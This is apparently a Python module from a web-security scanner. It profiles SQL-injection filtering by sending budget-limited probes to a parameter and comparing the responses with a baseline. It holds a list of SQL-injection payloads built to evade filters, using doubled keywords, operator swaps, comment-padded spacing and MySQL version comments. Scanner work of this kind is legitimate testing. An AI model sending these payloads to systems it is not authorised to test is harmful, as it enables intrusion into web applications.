# -*- coding: utf-8 -*-
"""应用层过滤画像：单变量探针 → 观察哪些形态还能产生信号。

用途：常规 payload 全部「无报错、无长度差」时，判断到底是
  · 参数没进 SQL（所有形态同一响应）
  · 还是 token 被删/被替换（某些形态出现差异）
只做观察，不做结论：`forms` 里列出的形态才值得进一步验证。

预算硬上限（默认 8 个带 payload 请求），且只在失败路径调用，
不改变正常目标的请求量。
"""
from __future__ import annotations

import re

# 每个探针只改「一个变量」：关键字形态 / 运算符 / 空格 / 注释
PROBE_TEMPLATES = (
    ("and_plain", "{v}' AND 1=1-- -"),
    ("or_plain", "{v}' OR 1=1-- -"),
    ("and_double", "{v}' AANNDD 1=1-- -"),
    ("or_double", "{v}' OORR 1=1-- -"),
    ("and_op", "{v}' && 1=1-- -"),
    ("or_op", "{v}' || 1=1-- -"),
    ("space_comment", "{v}'/**/AND/**/1=1-- -"),
    ("kw_split", "{v}' A/**/ND 1=1-- -"),
    ("version_comment", "{v}' /*!50000AND*/ 1=1-- -"),
    ("comment_wrap", "{v}'/*x*/AND/*x*/1=1-- -"),
)

_ERROR_RE = re.compile(
    r"(sql syntax|syntax error|unrecognized token|no such column|no such table|"
    r"error in your sql|quoted string not properly terminated|unclosed quotation)",
    re.I)


def probe_matrix(value: str = "1", budget: int = 8) -> list[tuple[str, str]]:
    """返回 (label, payload) 列表，最多 budget 个。"""
    n = max(0, int(budget))
    return [(label, tpl.format(v=str(value or "1")))
            for label, tpl in PROBE_TEMPLATES[:n]]


def classify(status: int, length: int, baseline_status: int, baseline_len: int,
             text: str = "", *, baseline_text: str = "", delta: int = 10) -> str:
    """单条探针的分类：blocked / error / diff / same。

    baseline_text：基线里本来就有的 SQL 报错字样不能算命中
    （否则教程页/帮助页会整片误判成 error）。
    """
    if status in (403, 406, 412, 429, 501, 508):
        return "blocked"
    if _ERROR_RE.search(text or "") and not _ERROR_RE.search(baseline_text or ""):
        return "error"
    if status != baseline_status:
        return "diff"
    if abs(length - baseline_len) > delta:
        return "diff"
    return "same"


def summarize(rows: list[dict]) -> dict:
    forms = [r["label"] for r in rows if r.get("state") in ("diff", "error")]
    blocked = [r["label"] for r in rows if r.get("state") == "blocked"]
    return {"forms": forms, "blocked": blocked, "requests": len(rows)}


def profile_filters(client, endpoint, param: str, value: str = "1",
                    budget: int = 8) -> dict:
    """发单变量探针并汇总。所有请求走调用方传入的 SafeHttpClient。

    返回 {rows, forms, blocked, requests, baseline, error}。
    """
    from app.services.prober import _build_request

    rows: list[dict] = []
    try:
        url, q, d = _build_request(endpoint, param, str(value or "1"))
        base = client.request(endpoint.method, url, params=q, data=d,
                              payload=str(value or "1"), audit=False)
        b_text = base.text or ""
        b_status, b_len = base.status_code, len(b_text)
    except Exception as exc:
        return {"rows": [], "forms": [], "blocked": [], "requests": 0,
                "baseline": None, "error": f"baseline failed: {exc}"}

    for label, payload in probe_matrix(value, budget):
        try:
            url, q, d = _build_request(endpoint, param, payload)
            resp = client.request(endpoint.method, url, params=q, data=d,
                                  payload=payload)
        except Exception as exc:
            rows.append({"label": label, "payload": payload, "state": "error",
                         "error": str(exc)})
            continue
        text = resp.text or ""
        rows.append({"label": label, "payload": payload,
                     "state": classify(resp.status_code, len(text),
                                       b_status, b_len, text,
                                       baseline_text=b_text),
                     "status": resp.status_code, "len": len(text)})

    out = summarize(rows)
    out.update({"rows": rows, "baseline": {"status": b_status, "len": b_len},
                "error": None})
    return out
